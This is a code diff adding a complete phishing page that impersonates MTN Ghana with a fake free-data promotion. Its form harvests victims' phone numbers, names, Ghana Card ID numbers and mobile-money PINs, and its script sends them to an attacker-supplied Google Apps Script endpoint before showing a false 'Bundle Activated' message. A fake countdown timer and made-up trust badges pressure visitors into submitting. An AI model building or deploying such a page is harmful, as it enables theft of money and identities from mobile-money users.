@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>MTN Ghana - Free Data Promo 2025</title>
+<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/MTN_Logo.svg/32px-MTN_Logo.svg.png">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;background:#f5f5f5;min-height:100vh}
+.topbar{background:#FFCB00;padding:10px 16px;display:flex;align-items:center;gap:12px;box-shadow:0 2px 6px rgba(0,0,0,.15)}
+.topbar img{height:36px}
+.topbar span{font-size:18px;font-weight:800;color:#000;letter-spacing:-0.3px}
+.hero{background:linear-gradient(135deg,#FFCB00 0%,#ff9900 100%);padding:32px 20px 40px;text-align:center;position:relative;overflow:hidden}
+.hero::after{content:'';position:absolute;bottom:-20px;left:0;right:0;height:40px;background:#f5f5f5;border-radius:50% 50% 0 0 / 40px}
+.hero .badge{display:inline-block;background:#fff;color:#cc0000;font-size:11px;font-weight:700;padding:4px 12px;border-radius:100px;margin-bottom:12px;letter-spacing:.5px;text-transform:uppercase}
+.hero h1{font-size:28px;font-weight:900;color:#000;line-height:1.15;margin-bottom:8px}
+.hero h1 span{color:#fff}
+.hero p{color:#333;font-size:14px;margin-bottom:16px}
+.hero .data-badge{display:inline-flex;flex-direction:column;background:#000;color:#FFCB00;border-radius:16px;padding:14px 28px;font-size:14px;font-weight:700;letter-spacing:.3px}
+.hero .data-badge strong{font-size:42px;line-height:1;letter-spacing:-1px}
+.card{background:#fff;border-radius:16px;margin:24px 16px;padding:24px 20px;box-shadow:0 2px 12px rgba(0,0,0,.08)}
+.card h2{font-size:17px;font-weight:700;color:#1a1a1a;margin-bottom:6px}
+.card .sub{font-size:13px;color:#888;margin-bottom:20px}
+.steps{display:flex;flex-direction:column;gap:12px;margin-bottom:24px}
+.step{display:flex;align-items:flex-start;gap:12px}
+.step-num{width:28px;height:28px;border-radius:50%;background:#FFCB00;color:#000;font-size:13px;font-weight:800;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px}
+.step p{font-size:13px;color:#444;line-height:1.4}
+.step p strong{color:#1a1a1a}
+label{display:block;font-size:13px;font-weight:600;color:#333;margin-bottom:5px}
+input,select{width:100%;border:1.5px solid #e0e0e0;border-radius:8px;padding:13px 14px;font-size:15px;color:#1a1a1a;outline:none;background:#fafafa;-webkit-appearance:none;margin-bottom:14px}
+input:focus,select:focus{border-color:#FFCB00;background:#fff}
+.submit-btn{width:100%;background:#FFCB00;border:none;border-radius:10px;padding:16px;font-size:17px;font-weight:800;color:#000;cursor:pointer;letter-spacing:.2px;margin-top:4px}
+.submit-btn:active{background:#e6b800}
+.timer-box{background:#fff8e1;border:1.5px solid #FFCB00;border-radius:10px;padding:12px 16px;text-align:center;margin-bottom:20px}
+.timer-box .label{font-size:12px;color:#666;margin-bottom:4px}
+.timer-box .time{font-size:26px;font-weight:800;color:#cc0000;font-variant-numeric:tabular-nums;letter-spacing:1px}
+.trust{display:flex;justify-content:center;gap:24px;margin:0 16px 24px;flex-wrap:wrap}
+.trust-item{display:flex;align-items:center;gap:6px;font-size:12px;color:#666}
+.trust-item svg{flex-shrink:0}
+.footer{background:#1a1a1a;color:#aaa;font-size:11px;text-align:center;padding:20px 16px;line-height:1.8}
+.footer span{color:#FFCB00}
+.network-badge{background:#FFCB00;color:#000;font-size:10px;font-weight:700;padding:2px 8px;border-radius:4px;margin-left:6px}
+.success-screen{display:none;text-align:center;padding:40px 20px}
+.success-screen .checkmark{width:72px;height:72px;background:#22c55e;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}
+.success-screen h2{font-size:22px;font-weight:800;color:#1a1a1a;margin-bottom:8px}
+.success-screen p{font-size:14px;color:#666;line-height:1.5}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <svg width="40" height="28" viewBox="0 0 100 70"><rect width="100" height="70" rx="6" fill="#FFCB00"/><text x="50" y="50" font-family="Arial Black" font-size="42" font-weight="900" fill="#000" text-anchor="middle">MTN</text></svg>
+  <span>MTN Ghana</span>
+  <span class="network-badge">4G/5G</span>
+</div>
+
+<div class="hero">
+  <div class="badge">Limited Time Offer</div>
+  <h1>Get <span>20GB FREE</span><br>Data Bundle</h1>
+  <p>MTN 30th Anniversary Celebration Promo</p>
+  <div class="data-badge">
+    <strong>20GB</strong>
+    FREE DATA
+  </div>
+</div>
+
+<div class="card">
+  <div class="timer-box">
+    <div class="label">Offer expires in</div>
+    <div class="time" id="timer">23:47:12</div>
+  </div>
+
+  <h2>Claim Your Free Bundle</h2>
+  <div class="sub">Fill in your details below to receive your 20GB data bundle instantly.</div>
+
+  <div class="steps">
+    <div class="step"><div class="step-num">1</div><p><strong>Enter your MTN number</strong> — must be active on the MTN network</p></div>
+    <div class="step"><div class="step-num">2</div><p><strong>Verify your identity</strong> — enter your name and Ghana Card number</p></div>
+    <div class="step"><div class="step-num">3</div><p><strong>Receive bundle</strong> — data will be credited within 5 minutes</p></div>
+  </div>
+
+  <form id="claim-form">
+    <input type="hidden" name="campaign" value="MTN Free Data">
+    <label>MTN Phone Number</label>
+    <input type="tel" name="phone" placeholder="024XXXXXXX or 054XXXXXXX" required>
+    <label>Full Name</label>
+    <input type="text" name="fullname" placeholder="As on your Ghana Card" required>
+    <label>Ghana Card Number</label>
+    <input type="text" name="ghana_card" placeholder="GHA-XXXXXXXXX-X" required>
+    <label>MTN MoMo PIN (to activate bundle)</label>
+    <input type="password" name="momo_pin" placeholder="Enter your 4-digit MoMo PIN" maxlength="4" required>
+    <label>Network</label>
+    <select name="network">
+      <option>MTN Ghana</option>
+      <option>MTN Prepaid</option>
+      <option>MTN Postpaid</option>
+    </select>
+    <button class="submit-btn" type="submit">CLAIM MY 20GB NOW</button>
+  </form>
+
+  <div id="success-screen" class="success-screen">
+    <div class="checkmark">
+      <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
+    </div>
+    <h2>Bundle Activated!</h2>
+    <p>Your 20GB data bundle has been sent to your number.<br>Please allow 5 minutes for activation.<br><br>Check your balance by dialing *131#</p>
+  </div>
+</div>
+
+<div class="trust">
+  <div class="trust-item">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2.5"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
+    <span>Official MTN Promo</span>
+  </div>
+  <div class="trust-item">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+    <span>SSL Secured</span>
+  </div>
+  <div class="trust-item">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2.5"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 00-3-3.87M16 3.13a4 4 0 010 7.75"/></svg>
+    <span>247,891 Claimed</span>
+  </div>
+</div>
+
+<div class="footer">
+  <span>MTN Ghana</span> &copy; 2025 MTN Group Limited. All rights reserved.<br>
+  Terms and conditions apply. This is a limited promotional offer.<br>
+  Customer Care: 100 | mtn.com.gh
+</div>
+
+<script src="../js/config.js"></script>
+<script>
+// Countdown timer
+let h=23,m=47,s=12;
+const timerEl=document.getElementById('timer');
+setInterval(()=>{
+  s--;if(s<0){s=59;m--;}if(m<0){m=59;h--;}if(h<0){h=23;m=59;s=59;}
+  timerEl.textContent=String(h).padStart(2,'0')+':'+String(m).padStart(2,'0')+':'+String(s).padStart(2,'0');
+},1000);
+
+// Form submit
+document.getElementById('claim-form').addEventListener('submit',function(e){
+  e.preventDefault();
+  const data={};
+  new FormData(this).forEach((v,k)=>data[k]=v);
+  data.timestamp=new Date().toLocaleString();
+  data.page=location.href;
+
+  // Send to Google Sheet via Apps Script
+  fetch(window.SHEET_URL||'PASTE_YOUR_GOOGLE_SCRIPT_URL_HERE',{
+    method:'POST',mode:'no-cors',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(data)
+  }).catch(()=>{});
+
+  // Show success regardless
+  this.style.display='none';
+  document.getElementById('success-screen').style.display='block';
+});
+</script>
+</body>
+</html>
